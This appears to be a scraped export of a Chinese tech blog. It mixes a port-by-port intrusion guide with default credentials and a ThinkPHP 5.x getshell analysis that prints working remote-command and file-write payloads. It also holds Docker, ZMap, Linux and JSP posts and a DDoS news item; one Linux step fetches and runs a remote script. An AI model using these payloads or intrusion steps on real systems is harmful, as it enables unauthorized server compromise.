1`（1）对于开放139/445端口的主机，一般尝试利用溢出漏洞对远程主机进行溢出攻击，成功后直接获得系统权限。利用msf的ms-017永恒之蓝。（https:``//blog.csdn.net/qq_41880069/article/details/82908131）``（2）对于攻击只开放445端口的主机，黑客一般使用工具‘MS06040’或‘MS08067’.可使用专用的445端口扫描器进行扫描。NS08067溢出工具对windows2003系统的溢出十分有效，工具基本使用参数在cmd下会有提示。（https:``//blog.csdn.net/god_7z1/article/details/6773652）``（3）对于开放139/445端口的主机，黑客一般使用IPC$进行渗透。在没有使用特点的账户和密码进行空连接时，权限是最小的。获得系统特定账户和密码成为提升权限的关键了，比如获得administrator账户的口令。（https:``//blog.warhut.cn/dmbj/145.html）``（4）对于开放139/445端口的主机，可利用共享获取敏感信息，这也是内网渗透中收集信息的基本途径。` 1433端口渗透剖析1433是SQLServer默认的端口，SQL Server服务使用两个端口：tcp-1433、UDP-1434.其中1433用于供SQLServer对外提供服务，1434用于向请求者返回SQLServer使用了哪些TCP/IP端口。1433端口通常遭到黑客的攻击，而且攻击的方式层出不穷。最严重的莫过于远程溢出漏洞了，如由于SQL注射攻击的兴起，各类数据库时刻面临着安全威胁。利用SQL注射技术对数据库进行渗透是目前比较流行的攻击方式，此类技术属于脚本渗透技术。 1`（1）对于开放1433端口的SQL Server2000的数据库服务器，黑客尝试使用远程溢出漏洞对主机进行溢出测试，成功后直接获得系统权限。（https:``//blog.csdn.net/gxj022/article/details/4593015）``（2）暴力破解技术是一项经典的技术。一般破解的对象都是SA用户。通过字典破解的方式很快破解出SA的密码。（https:``//blog.csdn.net/kali_linux/article/details/50499576）``（3）嗅探技术同样能嗅探到SQL Server的登录密码。``（4）由于脚本程序编写的不严密，例如，程序员对参数过滤不严等，这都会造成严重的注射漏洞。通过SQL注射可间接性的对数据库服务器进行渗透，通过调用一些存储过程执行系统命令。可以使用SQL综合利用工具完成。` 1521端口渗透剖析1521是大型数据库Oracle的默认监听端口，估计新手还对此端口比较陌生，平时大家接触的比较多的是Access，MSSQL以及MYSQL这三种数据库。一般大型站点才会部署这种比较昂贵的数据库系统。对于渗透这种比较复杂的数据库系统，黑客的思路如下： 1`（1）Oracle拥有非常多的默认用户名和密码，为了获得数据库系统的访问权限，破解数据库系统用户以及密码是黑客必须攻破的一道安全防线。``（2）SQL注射同样对Oracle十分有效，通过注射可获得数据库的敏感信息，包括管理员密码等。``（3）在注入点直接创建java，执行系统命令。（4）https:``//www.leiphone.com/news/201711/JjzXFp46zEPMvJod.html` -————————————————————–以上的端口渗透原理只是用作分析，现在网上有很多自动的端口入侵工具，比如445批量抓鸡器或者1433批量抓鸡器。大家有兴趣的可以去网上下载试用。———————————————————— 2049端口渗透剖析 NFS（Network File System）即网络文件系统，是FreeBSD支持的文件系统中的一种，它允许网络中的计算机之间通过TCP/IP网络共享资源。在NFS的应用中，本地NFS的客户端应用可以透明地读写位于远端NFS服务器上的文件，就像访问本地文件一样。如今NFS具备了防止被利用导出文件夹的功能，但遗留系统中的NFS服务配置不当，则仍可能遭到恶意攻击者的利用。 3306端口渗透剖析 3306是MYSQL数据库默认的监听端口，通常部署在中型web系统中。在国内LAMP的配置是非常流行的，对于php+mysql构架的攻击也是属于比较热门的话题。mysql数据库允许用户使用自定义函数功能，这使得黑客可编写恶意的自定义函数对服务器进行渗透，最后取得服务器最高权限。对于3306端口的渗透，黑客的方法如下: 1`（1）由于管理者安全意识淡薄，通常管理密码设置过于简单，甚至为空口令。使用破解软件很容易破解此类密码，利用破解的密码登录远程mysql数据库，上传构造的恶意UDF自定义函数代码进行注册，通过调用注册的恶意函数执行系统命令。或者向web目录导出恶意的脚本程序，以控制整个web系统。``（2）功能强大的‘cain’同样支持对3306端口的嗅探，同时嗅探也是渗透思路的一种。``（3）SQL注入同样对mysql数据库威胁巨大，不仅可以获取数据库的敏感信息，还可使用load_file()函数读取系统的敏感配置文件或者从web数据库链接文件中获得root口令等，导出恶意代码到指定路径等。` 3389端口渗透剖析3389是windows远程桌面服务默认监听的端口，管理员通过远程桌面对服务器进行维护，这给管理工作带来的极大的方便。通常此端口也是黑客们较为感兴趣的端口之一，利用它可对远程服务器进行控制，而且不需要另外安装额外的软件，实现方法比较简单。当然这也是系统合法的服务，通常是不会被杀毒软件所查杀的。使用‘输入法漏洞’进行渗透。 1`（1）对于windows2000的旧系统版本，使用‘输入法漏洞’进行渗透。``（2）cain是一款超级的渗透工具，同样支持对3389端口的嗅探。``（3）Shift粘滞键后门：5次shift后门``（4）社会工程学通常是最可怕的攻击技术，如果管理者的一切习惯和规律被黑客摸透的话，那么他管理的网络系统会因为他的弱点被渗透。（5）爆破3389端口。这里还是推荐使用hydra爆破工具。（6）ms12_020死亡蓝屏攻击。（https:``//www.cnblogs.com/R-Hacker/p/9178066.html）（7）https://www.cnblogs.com/backlion/p/9429738.html` 4899端口渗透剖析4899端口是remoteadministrator远程控制软件默认监听的端口，也就是平时常说的radmini影子。radmini目前支持TCP/IP协议，应用十分广泛，在很多服务器上都会看到该款软件的影子。对于此软件的渗透，思路如下： 1`（1）radmini同样存在不少弱口令的主机，通过专用扫描器可探测到此类存在漏洞的主机。``（2）radmini远控的连接密码和端口都是写入到注册表系统中的，通过使用webshell注册表读取功能可读取radmini在注册表的各项键值内容，从而破解加密的密码散列。` 5432端口渗透剖析 PostgreSQL是一种特性非常齐全的自由软件的对象–关系型数据库管理系统，可以说是目前世界上最先进，功能最强大的自由数据库管理系统。包括kali系统中msf也使用这个数据库；浅谈postgresql数据库攻击技术 大部分关于它的攻击依旧是sql注入，所以注入才是数据库不变的话题。 1`（1）爆破：弱口令：postgres postgres``（2）缓冲区溢出：CVE-2014-2669。（http:``//drops.xmd5.com/static/drops/tips-6449.html）（3）远程代码执行：CVE-2018-1058。（https://www.secpulse.com/archives/69153.html）` 5631端口渗透剖析5631端口是著名远程控制软件pcanywhere的默认监听端口，同时也是世界领先的远程控制软件。利用此软件，用户可以有效管理计算机并快速解决技术支持问题。由于软件的设计缺陷，使得黑客可随意下载保存连接密码的*.cif文件，通过专用破解软件进行破解。这些操作都必须在拥有一定权限下才可完成，至少通过脚本渗透获得一个webshell。通常这些操作在黑客界被称为pcanywhere提权技术。 1`PcAnyWhere提权。（https:``//blog.csdn.net/Fly_hps/article/details/80377199）` 5900端口渗透剖析5900端口是优秀远程控制软件VNC的默认监听端口，此软件由著名的AT&amp;T的欧洲研究实验室开发的。VNC是在基于unix和linux操作系统的免费的开放源码软件，远程控制能力强大，高效实用，其性能可以和windows和MAC中的任何一款控制软件媲美。对于该端口的渗透，思路如下： 1`（1）VNC软件存在密码验证绕过漏洞，此高危漏洞可以使得恶意攻击者不需要密码就可以登录到一个远程系统。``（2）cain同样支持对VNC的嗅探，同时支持端口修改。``（3）VNC的配置信息同样被写入注册表系统中，其中包括连接的密码和端口。利用webshell的注册表读取功能进行读取加密算法，然后破解。（4）VNC拒绝服务攻击（CVE-2015-5239）。（http:``//blogs.360.cn/post/vnc%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%BC%8F%E6%B4%9Ecve-2015-5239%E5%88%86%E6%9E%90.html）（5）VNC权限提升（CVE-2013-6886）。` 6379端口渗透剖析 Redis是一个开源的使用c语言写的，支持网络、可基于内存亦可持久化的日志型、key-value数据库。关于这个数据库这两年还是很火的，暴露出来的问题也很多。特别是前段时间暴露的未授权访问。 1`（1）爆破：弱口令``（2）未授权访问+配合ssh key提权。（http:``//www.alloyteam.com/2017/07/12910/）` 7001/7002端口渗透剖析 7001/7002通常是weblogic中间件端口 1`（1）弱口令、爆破，弱密码一般为weblogic/Oracle@123 or weblogic``（2）管理后台部署 war 后门``（3）SSRF``（4）反序列化漏洞``（5）weblogic_uachttps:``//github.com/vulhub/vulhub/tree/master/weblogic/ssrfhttps://bbs.pediy.com/thread-224954.htmhttps://fuping.site/2017/06.05/Weblogic-Vulnerability-Verification/https://blog.gdssecurity.com/labs/2015/3/30/weblogic-ssrf-and-xss-cve-2014-4241-cve-2014-4210-cve-2014-4.html` 8080端口渗透剖析8080端口通常是apache_Tomcat服务器默认监听端口，apache是世界使用排名第一的web服务器。国内很多大型系统都是使用apache服务器，对于这种大型服务器的渗透，主要有以下方法： 1`（1）Tomcat远程代码执行漏洞（https:``//www.freebuf.com/column/159200.html）``（2）Tomcat任意文件上传。（http:``//liehu.tass.com.cn/archives/836）``（3）Tomcat远程代码执行&amp;信息泄露。（https:``//paper.seebug.org/399/）``（4）Jboss远程代码执行。（http:``//mobile.www.cnblogs.com/Safe3/archive/2010/01/08/1642371.html）``（5）Jboss反序列化漏洞。（https:``//www.zybuluo.com/websec007/note/838374）``（6）Jboss漏洞利用。（https:``//blog.csdn.net/u011215939/article/details/79141624）` 27017端口渗透剖析 MongoDB，NoSQL数据库；攻击方法与其他数据库类似 1`（1）爆破：弱口令``（2）未授权访问；（http:``//www.cnblogs.com/LittleHann/p/6252421.html）（3）http://www.tiejiang.org/19157.htm`","categories":[{"name":"网络安全","slug":"网络安全","permalink":"https://www.5658.pw/categories/网络安全/"}],"tags":[{"name":"端口","slug":"端口","permalink":"https://www.5658.pw/tags/端口/"},{"name":"扫描","slug":"扫描","permalink":"https://www.5658.pw/tags/扫描/"},{"name":"网络安全","slug":"网络安全","permalink":"https://www.5658.pw/tags/网络安全/"}]},{"title":"Jsp填坑","slug":"Jsp填坑","date":"2019-01-03T07:16:43.000Z","updated":"2019-01-03T07:35:32.781Z","comments":true,"path":"2019/01/03/Jsp填坑/","link":"","permalink":"https://www.5658.pw/2019/01/03/Jsp填坑/","excerpt":"​ 今天改一个JSP项目，由于博主用的是MyEclipse最新的2018.8.0的，项目是老版本的(不知猴年马月的老东西了)导入项目后启动发现报错,错误信息为: File [&#47;WEB-INF&#47;jsp&#47;user&#47;rollpage.jsp] not found 文件没有找到？？？","text":"​ 今天改一个JSP项目，由于博主用的是MyEclipse最新的2018.8.0的，项目是老版本的(不知猴年马月的老东西了)导入项目后启动发现报错,错误信息为: File [&#47;WEB-INF&#47;jsp&#47;user&#47;rollpage.jsp] not found 文件没有找到？？？ 看到#47让我想到了SQL注入尾部的# 难道是把斜杠/给我转化为了字符 那换为绝对路径试试 ${pageContext.request.contextPath } 绝对路径还是这个错 什么鬼 ？去问问百度大哥 百度一下 竟然无果,360就不用说了(我要你们有何用) 回过头来再看下代码报错位置 &lt;%@include file=”/WEB-INF/jsp/common/head.jsp”%&gt; 突然想到了JSP的静态包含与动态包含 在jsp中include有两种形式，其中&lt;%@include file=”url”%&gt;是指令元素，&lt;jsp:include page=”” flush=”true”/&gt;是动作元素。&lt;%@include file=”url”%&gt;包含一个静态文件，而&lt;jsp:include page=”” flush=”true”/&gt;包含一个静态或动态文件。&lt;%@include file=”url”%&gt;不会检查文件的变化，适合包含一个静态文件，被包含的文件可以是html,jsp，文本文档，如果是html，文本文档，文件内容将会添加到jsp文件中&lt;%@include file=”url”%&gt;的位置上；如果包含一个jsp文件，这个jsp文件将会被执行，将结果添加到&lt;%@include file=”url”%&gt;的位置，但其变量无法使用。 &lt;jsp:include page=”” flush=”true”/&gt;总会检查文件中所发生的变化，适合包含动态页面，所以既可以用它包含静态文件，也可以用它包含动态文件，当包含动态文件时，flush的值必须为true，表示页面可以刷新。如果被包含的是jsp页面，还可以向被包含页传递参数，例如&lt;jsp:include page=”test.jsp” flush=”true”&gt;&lt;jsp:param name=”index” value=”TT”/&gt;&lt;jsp:param name=”home” value=”EE”/&gt;&lt;/jsp:include&gt;test.jsp为被包含页面。 &lt;%@include file=”url”%&gt;是先包含再编译，只会产生一个class文件，；&lt;jsp:include page=”” flush=”true”/&gt;是先编译再包含，会产生多个class文件。 值得注意的是，不管被包含的是动态文件还是静态文件，被包含的文件都不应该出现标签，这样会影响原jsp文件中的对应标记，有时还会出错。 最后来看下正确的Demo 运行无错 啊 舒服","categories":[{"name":"Java","slug":"Java","permalink":"https://www.5658.pw/categories/Java/"}],"tags":[{"name":"Java","slug":"Java","permalink":"https://www.5658.pw/tags/Java/"},{"name":"Jsp","slug":"Jsp","permalink":"https://www.5658.pw/tags/Jsp/"}]},{"title":"Docker搭建LNMP网站平台","slug":"Docker搭建LNMP网站平台","date":"2018-12-27T10:59:57.000Z","updated":"2018-12-27T13:00:55.979Z","comments":true,"path":"2018/12/27/Docker搭建LNMP网站平台/","link":"","permalink":"https://www.5658.pw/2018/12/27/Docker搭建LNMP网站平台/","excerpt":"​ 最近学Docker又入迷了:see_no_evil:那么来记录下wordpress搭建过程吧","text":"​ 最近学Docker又入迷了:see_no_evil:那么来记录下wordpress搭建过程吧 环境① 主机配置：VPS 3H 4G 5M SSD 100G ② 系统：CentOS 7.6.1810 ③ 内核：4.19.10-1.el7.elrepo.x86_64 ④数据库开发工具：DataGrip 创建mysql数据库容器 docker run -itd –name lnmp_mysql -p 3308:3306 -e MYSQL_ROOT_PASSWORD=123456 mysql –character-set-server=utf8 创建wp数据库 docker exec lnmp_mysql sh -c ‘exec mysql -uroot -p”$MYSQL_ROOT_PASSWORD” -e”create database wp”‘ 创建PHP环境容器 docker run -itd –name lnmp_web –link lnmp_mysql:db -p 88:80 -v /container_data/web:/var/www/html richarvey/nginx-php-fpm 以wordpress博客为例测试123wget https://cn.wordpress.org/wordpress-5.0.2-zh_CN.tar.gz tar zxvf wordpress-5.0.2-zh_CN.tar.gzmv wordpress/* /container_data/web/ 浏览器测试访问 http://localhost:88 这里的db 是mysql的别名可以使用一下命令查看 docker exec lnmp_web cat /etc/hosts 可以看到这里是db 所以数据库主机填db 填localhost会报错的哦 PS:我用的是VPS测试的 非虚拟机 个别目录需要根据自己定义的选择 在这里我都是默认的 部署成功 PS:大牛勿喷 博主只是一个入门小白","categories":[{"name":"Docker","slug":"Docker","permalink":"https://www.5658.pw/categories/Docker/"}],"tags":[{"name":"linux","slug":"linux","permalink":"https://www.5658.pw/tags/linux/"},{"name":"搭建","slug":"搭建","permalink":"https://www.5658.pw/tags/搭建/"},{"name":"Docker","slug":"Docker","permalink":"https://www.5658.pw/tags/Docker/"}]},{"title":"ZMap安装与使用","slug":"zmap安装与使用","date":"2018-12-23T11:34:26.000Z","updated":"2018-12-27T11:31:20.298Z","comments":true,"path":"2018/12/23/zmap安装与使用/","link":"","permalink":"https://www.5658.pw/2018/12/23/zmap安装与使用/","excerpt":"ZMap简介​ ZMap, 一个网络端口开放性的快速:zap:扫描工具。由密歇根大学研究人员组成的一个团队在2015年3月27日召开的Usenix国际安全研讨会上，宣布推出了一种名为”ZMap”的工具，这种工具能令一台普通的服务器在短短44分钟时间里扫描互联网上的每一个地址。Durumeric及其同事在2013年末开发了ZMap。在此之前，用软件扫描互联网需要耗时数周或数月，当时的工具比ZMap慢1000倍。","text":"ZMap简介​ ZMap, 一个网络端口开放性的快速:zap:扫描工具。由密歇根大学研究人员组成的一个团队在2015年3月27日召开的Usenix国际安全研讨会上，宣布推出了一种名为”ZMap”的工具，这种工具能令一台普通的服务器在短短44分钟时间里扫描互联网上的每一个地址。Durumeric及其同事在2013年末开发了ZMap。在此之前，用软件扫描互联网需要耗时数周或数月，当时的工具比ZMap慢1000倍。 传言它能45分钟扫描整个网络，也就是世界IP段子。条件:只要上行带宽满足的情况下(我想应该是5个10Gb/s的带宽插到一个服务器上) ZMap安装12345678yum install cmake gmp gmp-devel libpcap-devel gengetopt byacc flexwget https://github.com/zmap/zmap/archive/v1.2.0.tar.gz或者git clone https://github.com/zmap/zmap.git cd zmaptar -xvf v1.2.0.tar.gzcd zmap-1.2.0cmake -DENABLE_HARDENING=ONmakemake install PS:如果无法下载,就用VPN ZMap使用①扫世界段子(我经常用的) zmap -p &lt;端口&gt; -o result.txt -p 是要扫描的端口 例如扫描开放9002端口的主机 就是zmap -p 9002 -o result.txt -o 是把扫描的结果输出到文本中 PS: 官方文档https://github.com/zmap/zmap ​ 官网https://zmap.io","categories":[{"name":"Linux","slug":"Linux","permalink":"https://www.5658.pw/categories/Linux/"}],"tags":[{"name":"扫描器","slug":"扫描器","permalink":"https://www.5658.pw/tags/扫描器/"},{"name":"Internet","slug":"Internet","permalink":"https://www.5658.pw/tags/Internet/"}]},{"title":"联邦调查局查获15个DDoS-For-Hire网站","slug":"联邦调查局查获15个DDoS-For-Hire网站","date":"2018-12-20T11:13:31.000Z","updated":"2019-01-01T09:31:49.119Z","comments":true,"path":"2018/12/20/联邦调查局查获15个DDoS-For-Hire网站/","link":"","permalink":"https://www.5658.pw/2018/12/20/联邦调查局查获15个DDoS-For-Hire网站/","excerpt":"FBI刚刚救了圣诞节。","text":"FBI刚刚救了圣诞节。美国司法部今天早些时候宣布，FBI已经占领了15个“DDoS-for-hire”网站，并指控三个人运营其中一些服务。 DDoS-for-hire，或“Booter”或“Stresser”服务租用对受感染设备网络的访问，然后任何人，即使是最不懂技术的人，也可以使用它来启动分布式拒绝服务（DDoS）攻击任何网站并破坏其访问权限。 近年来，多个黑客组织通过使用大规模DDoS攻击取消PlayStation，Xbox网络和其他游戏服务器，破坏了数百万玩家的圣诞节。 12“这项行动中提到的引导服务涉嫌袭击美国和海外的各种受害者，包括金融机构，大学，互联网服务提供商，政府系统和各种游戏平台，”美国司法部说。“针对DDoS服务的行动发生在圣诞假期前一周，这个历史上一直困扰着游戏世界中多产的DDoS攻击。” 今年4月，荷兰警方取消了世界上最大的DDoS-for-hire服务，称为++Webstresser++，帮助网络罪犯发动超过400万次攻击，并逮捕了其管理员。 在网络压力测试服务的幌子下销售访问DDoS攻击并在周四被联邦调查局抓获的15个引导域包括： critical-boot.com ragebooter.com anonsecurityteam.com downthem.org quantumstress.net booter.ninja bullstresser.net defcon.pro str3ssed.me defianceprotocol.com layer7-stresser.xyz netstress.org request.rip torsecurityteam.org Vbooter.org 据称， 这些DDoS-for-Hire服务用于针对美国和国外的各种受害者，包括金融机构，大学，互联网服务提供商，政府系统和各种游戏平台。 12月12日，美国检察官办公室还指控 宾夕法尼亚州23岁的++大卫·布科斯基++（++David Bukoski）++在2012 年11月29日开始运营++Quantum++ ++Stresser++，这是运营时间最长的DDoS服务之一，截至11月29日已有超过80,000个客户订阅。 2018年仅此一项，Quantum Stresser就被用于针对全球受害者（包括阿拉斯加和加利福尼亚州）发起超过50,000次“实际或未遂”的DDoS攻击。 1美国检察官布莱恩施罗德说：“像这样的租赁服务的DDoS构成了重大的国家威胁。” “这些协调调查和起诉证明了跨区域合作和与公共部门合作伙伴协调的重要性。” 除了缉获15个引导服务外，联邦调查局还对两名涉嫌网络犯罪分子 - 30岁的马修加特雷和25岁的胡安马丁内斯提起刑事诉讼 - 据称他们与被称为“Downthem”的DDoS租用服务有关联。 Ampnode“。 据FBI称，2014年10月至2018年11月期间，Downthem拥有超过2000个客户订阅，并已被用于“进行或试图进行超过200,000次DDoS攻击”。 最近的镇压服务器不仅向其他潜在的DDoS小贩提供警告，而且还向出租这些服务的用户发出警告，因为联邦调查局警告说，它将寻求起诉任何支付此类服务的人。","categories":[{"name":"DDos","slug":"DDos","permalink":"https://www.5658.pw/categories/DDos/"}],"tags":[{"name":"DDos","slug":"DDos","permalink":"https://www.5658.pw/tags/DDos/"},{"name":"网络压力测试","slug":"网络压力测试","permalink":"https://www.5658.pw/tags/网络压力测试/"},{"name":"僵尸网络","slug":"僵尸网络","permalink":"https://www.5658.pw/tags/僵尸网络/"},{"name":"Booter","slug":"Booter","permalink":"https://www.5658.pw/tags/Booter/"},{"name":"Stresser","slug":"Stresser","permalink":"https://www.5658.pw/tags/Stresser/"}]},{"title":"ThinkPHP5.x 前台getshell分析","slug":"ThinkPHP5-x-前台getshell分析","date":"2018-12-11T04:27:51.000Z","updated":"2019-05-11T05:44:28.232Z","comments":true,"path":"2018/12/11/ThinkPHP5-x-前台getshell分析/","link":"","permalink":"https://www.5658.pw/2018/12/11/ThinkPHP5-x-前台getshell分析/","excerpt":"前言昨晚微博刷着刷着看到一个无条件的ThinkPHP5.x通杀前台getshell，然后群里面师傅们也都在讨论这件事了。感觉是个TP5写的站都是通杀，怕是一场腥风血雨。。。 官方给出的补丁，可以看到是路由上面出的问题，怪不得通杀。 漏洞分析分析版本 ThinkPHP 5.1.30","text":"前言昨晚微博刷着刷着看到一个无条件的ThinkPHP5.x通杀前台getshell，然后群里面师傅们也都在讨论这件事了。感觉是个TP5写的站都是通杀，怕是一场腥风血雨。。。 官方给出的补丁，可以看到是路由上面出的问题，怪不得通杀。 漏洞分析分析版本 ThinkPHP 5.1.30 路由调用先从thinkphp/library/think/route/dispatch/Url.php:20看起 123456public function init()&#123; // 解析默认的URL规则 $result = $this-&gt;parseUrl($this-&gt;dispatch); return (new Module($this-&gt;request, $this-&gt;rule, $result))-&gt;init();&#125; init中进行了url解析然后将返回值赋值给$result，然后再传入到Module的init()中。 先来到解析url的部分，可以一直跟进到thinkphp/library/think/route/Rule.php:947 12345678910111213141516171819202122232425public function parseUrlPath($url)&#123; // 分隔符替换 确保路由定义使用统一的分隔符 $url = str_replace(&apos;|&apos;, &apos;/&apos;, $url); $url = trim($url, &apos;/&apos;); $var = []; if (false !== strpos($url, &apos;?&apos;)) &#123; // [模块/控制器/操作?]参数1=值1&amp;参数2=值2... $info = parse_url($url); $path = explode(&apos;/&apos;, $info[&apos;path&apos;]); parse_str($info[&apos;query&apos;], $var); &#125; elseif (strpos($url, &apos;/&apos;)) &#123; // [模块/控制器/操作] $path = explode(&apos;/&apos;, $url); &#125; elseif (false !== strpos($url, &apos;=&apos;)) &#123; // 参数1=值1&amp;参数2=值2... $path = []; parse_str($url, $var); &#125; else &#123; $path = [$url]; &#125; return [$path, $var];&#125; 可以看到是单纯的根据/来进行分割，也就意味着其中可以插入一些自定义的字符。 最后返回一个这样的[$module, $controller, $action]数组 在Module初始化的时候，就会将$result数组赋值到$this-&gt;dispatch变量中 然后来到Module的init()方法 1234567891011121314151617181920212223242526272829thinkphp/library/think/route/dispatch/Module.php:27public function init()&#123; parent::init(); $result = $this-&gt;dispatch; if (is_string($result)) &#123; $result = explode(&apos;/&apos;, $result); &#125; ..... // 是否自动转换控制器和操作名 $convert = is_bool($this-&gt;convert) ? $this-&gt;convert : $this-&gt;rule-&gt;getConfig(&apos;url_convert&apos;); // 获取控制器名 $controller = strip_tags($result[1] ?: $this-&gt;rule-&gt;getConfig(&apos;default_controller&apos;)); $this-&gt;controller = $convert ? strtolower($controller) : $controller; // 获取操作名 $this-&gt;actionName = strip_tags($result[2] ?: $this-&gt;rule-&gt;getConfig(&apos;default_action&apos;)); // 设置当前请求的控制器、操作 $this-&gt;request -&gt;setController(Loader::parseName($this-&gt;controller, 1)) -&gt;setAction($this-&gt;actionName); return $this;&#125; 可以看到$this-&gt;controller和$this-&gt;actionName是从变量$result值而来的 123$controller = strip_tags($result[1] ?: $this-&gt;rule-&gt;getConfig(&apos;default_controller&apos;));$this-&gt;controller = $convert ? strtolower($controller) : $controller;$this-&gt;actionName = strip_tags($result[2] ?: $this-&gt;rule-&gt;getConfig(&apos;default_action&apos;)); 而这$result的值是由$this-&gt;dispatch的值而来的。 1$result = $this-&gt;dispatch; 到了这里，漏洞也就差不多出来了，由于获取$controller和$action时没有进行什么检验，后面就是常规的调用类触发方法。 导致可以调用任意类的任意方法。只要找到几个存在危险函数调用的地方，就可以深度利用这个漏洞。 寻找触发点触发点似乎有蛮多的，就挑几个说一下 \\think\\Container invokefunction1234567891011thinkphp/library/think/Container.php:340public function invokeFunction($function, $vars = [])&#123; try &#123; $reflect = new ReflectionFunction($function); $args = $this-&gt;bindParams($reflect, $vars); return call_user_func_array($function, $args); &#125; catch (ReflectionException $e) &#123; throw new Exception(&apos;function not exists: &apos; . $function . &apos;()&apos;); &#125;&#125; 可以直接看到call_user_func_array的调用，传入对应的$function和$var即可 1234s=index/\\think\\Container/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=dir \\think\\template\\driver\\File write123456789101112131415161718thinkphp/library/think/template/driver/File.php:27public function write($cacheFile, $content)&#123; // 检测模板目录 $dir = dirname($cacheFile); if (!is_dir($dir)) &#123; mkdir($dir, 0755, true); &#125; // 生成模板缓存文件 if (false === file_put_contents($cacheFile, $content)) &#123; throw new Exception(&apos;cache write error:&apos; . $cacheFile, 11602); &#125;&#125;s=index/\\think\\template\\driver\\File/write&amp;cacheFile=1.php&amp;content=&lt;?=phpinfo(); 就会生成一个1.php的文件 最后可以调用的类还是相当多的，今天网上一搜，好多站都已经是马场了，惨惨惨。。。 后来知道5.0和5.1以及linux和win有点差异，放一个通用的payload 12345index.php?s=index/\\think\\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=dir","categories":[{"name":"Getshell","slug":"Getshell","permalink":"https://www.5658.pw/categories/Getshell/"}],"tags":[{"name":"PHP","slug":"PHP","permalink":"https://www.5658.pw/tags/PHP/"},{"name":"ThinkPHP5","slug":"ThinkPHP5","permalink":"https://www.5658.pw/tags/ThinkPHP5/"},{"name":"getshell","slug":"getshell","permalink":"https://www.5658.pw/tags/getshell/"}]},{"title":"自己用到的部分linux命令","slug":"自己常用的部分linux命令","date":"2018-12-10T12:36:26.000Z","updated":"2018-12-27T11:31:33.563Z","comments":true,"path":"2018/12/10/自己常用的部分linux命令/","link":"","permalink":"https://www.5658.pw/2018/12/10/自己常用的部分linux命令/","excerpt":"基本命令①Centos 测速 wget http://yun.name168.cn/speed.py python speed.py ②文件拖拽 yum install -y lrzsz ③安装java","text":"基本命令①Centos 测速 wget http://yun.name168.cn/speed.py python speed.py ②文件拖拽 yum install -y lrzsz ③安装java yum install -y java yum -y list java* # 查看 yum search java | grep -i –color JDK yum -y remove java-1.8.0-openjdk* # 移除 yum -y install java-1.8.0-openjdk* # 安装 A.手动下载配置 1、复制安装包到/usr/java目录中(目录可以自己选)：cp jdk-11.0.1_linux-x64_bin.tar.gz /usr/java/ 2、切换到/usr/java目录下：cd /usr/java/ 3、解压缩包：tar -zxvf jdk-11.0.1_linux-x64_bin.tar.gz 4、配置环境变量，使用vim /etc/profile 编辑profile文件 输入： vim /etc/profile，向文件里面追加以下内容： 1234567891011#set java environmentJAVA_HOME=/usr/java/jdk-11.0.1JRE_HOME=$JAVA_HOME/jrePATH=$PATH:$JAVA_HOME/bin:$JRE_HOME/binCLASSPATH=.:$JAVA_HOME/lib/dt.jar:$JAVA_HOME/lib/tools.jar:$JRE_HOME/libexport JAVA_HOME JRE_HOME PATH CLASSPATH PS: oracle官网地址:https://www.oracle.com/technetwork/java/javase/downloads/jdk8-downloads-2133151.html CentOS7使用firewalld打开关闭防火墙与端口① firewalld的基本使用 启动： systemctl start firewalld 关闭： systemctl stop firewalld 查看状态： systemctl status firewalld 开机禁用 ： systemctl disable firewalld 开机启用 ： systemctl enable firewalld ② systemctl服务管理 启动一个服务：systemctl start firewalld.service 关闭一个服务：systemctl stop firewalld.service 重启一个服务：systemctl restart firewalld.service 显示一个服务的状态：systemctl status firewalld.service 在开机时启用一个服务：systemctl enable firewalld.service 在开机时禁用一个服务：systemctl disable firewalld.service 查看服务是否开机启动：systemctl is-enabled firewalld.service 查看已启动的服务列表：systemctl list-unit-files|grep enabled 查看启动失败的服务列表：systemctl –failed ③ 配置firewalld-cmd 查看版本： firewall-cmd –version 查看帮助： firewall-cmd –help 显示状态： firewall-cmd –state 查看所有打开的端口： firewall-cmd –zone=public –list-ports 更新防火墙规则： firewall-cmd –reload 查看区域信息: firewall-cmd –get-active-zones 查看指定接口所属区域： firewall-cmd –get-zone-of-interface=eth0 拒绝所有包：firewall-cmd –panic-on 取消拒绝状态： firewall-cmd –panic-off 查看是否拒绝： firewall-cmd –query-panic ④端口管理 添加 firewall-cmd –zone=public –add-port=80/tcp –permanent (–permanent永久生效，没有此参数重启后失效） 重新载入 firewall-cmd –reload 查看 firewall-cmd –zone= public –query-port=80/tcp 删除 firewall-cmd –zone= public –remove-port=80/tcp –permanent Centos6.6系统汉化编辑i18n配置文件: vi /etc/sysconfig/i18n 1234进行如下配置并保存退出：#LANG=&quot;en_US.UTF-8&quot;LANG=&quot;zh_CN.UTF-8&quot;SYSFONT=&quot;latarcyrheb-sun16&quot; 内核升级 a.查看什么系统 cat /etc/redhat-release b.查看内核版本 uname -r c.启用 ELRepo 仓库： rpm -Uvh http://www.elrepo.org/elrepo-release-7.0-3.el7.elrepo.noarch.rpm d.查看可用内核包： yum –disablerepo=”*” –enablerepo=”elrepo-kernel” list available e.下载所需要的内核 yum –enablerepo=elrepo-kernel install kernel-lt f.重启生效 reboot 最后附上一个Linux命令统计的网站,常用的命令在里面都能找得到 https://wangchujiang.com/linux-command/","categories":[{"name":"Linux","slug":"Linux","permalink":"https://www.5658.pw/categories/Linux/"}],"tags":[{"name":"linux","slug":"linux","permalink":"https://www.5658.pw/tags/linux/"},{"name":"防火墙","slug":"防火墙","permalink":"https://www.5658.pw/tags/防火墙/"},{"name":"centos 7","slug":"centos-7","permalink":"https://www.5658.pw/tags/centos-7/"}]},{"title":"win10安装vue开发环境","slug":"win10安装vue开发环境","date":"2018-11-21T02:13:16.000Z","updated":"2018-12-10T13:40:53.860Z","comments":true,"path":"2018/11/21/win10安装vue开发环境/","link":"","permalink":"https://www.5658.pw/2018/11/21/win10安装vue开发环境/","excerpt":"引语看到有小伙伴给我留言说怎么不更新了，额……. 最近一直忙于做其他项目实在是没时间更新博客啊 最近在开发在一个小商城项目的时候遇到了一些关于Vue的问题 解决问题 解决了一天。先来讲讲这个小程序项目吧。 我是在这个微信商城小程序项目二次开发(基本的框架还是别人搭的)，前后端分离的项目。用到的技术","text":"引语看到有小伙伴给我留言说怎么不更新了，额……. 最近一直忙于做其他项目实在是没时间更新博客啊 最近在开发在一个小商城项目的时候遇到了一些关于Vue的问题 解决问题 